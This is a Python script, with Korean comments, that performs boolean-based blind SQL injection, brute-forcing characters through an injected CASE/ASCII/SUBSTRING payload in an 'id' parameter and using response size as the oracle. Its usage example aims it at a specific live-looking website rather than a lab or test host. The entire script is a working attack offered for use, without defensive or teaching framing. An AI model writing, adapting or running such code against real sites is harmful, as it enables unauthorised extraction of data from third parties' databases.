import requests

def blind_sql_injection(url, database_name_length):
    extracted_database = ""
    
    for position in range(1, database_name_length + 1):
        for ascii_value in range(32, 127):
            payload = f"5922 and (case when (ascii(substring((SELECT * FROM noonoo.table_name limit 0,1),{position},1)))={ascii_value} then 1 else 2 end)=1"
            full_url = f"{url}?id={payload}"
            
            response = requests.get(full_url)
            
            if len(response.content) > 700000:  # 응답에 따라 조건을 조정해야 할 수 있습니다
                extracted_database += chr(ascii_value)
                print(f"Found character at position {position}: {chr(ascii_value)}")
                break
    
    return extracted_database

# 사용 예시
target_url = "https://nooo1.tv/all/program_view.php"
database_name_length = 20  # 예상되는 데이터베이스 이름의 최대 길이

result = blind_sql_injection(target_url, database_name_length)
print(f"Extracted database name: {result}")

